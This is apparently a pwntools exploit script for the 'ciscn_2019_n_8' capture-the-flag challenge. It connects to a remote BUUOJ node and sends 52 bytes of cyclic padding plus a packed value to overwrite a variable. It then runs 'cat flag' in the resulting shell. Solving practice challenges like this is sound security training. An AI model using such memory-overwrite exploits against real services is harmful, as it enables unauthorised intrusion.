from pwn import * 

#io = process('./ciscn_2019_n_8')
io = remote('node3.buuoj.cn',28242)
payload = cyclic(52)+p32(0x11)

io.sendline(payload)
io.sendline('cat flag')
io.interactive()



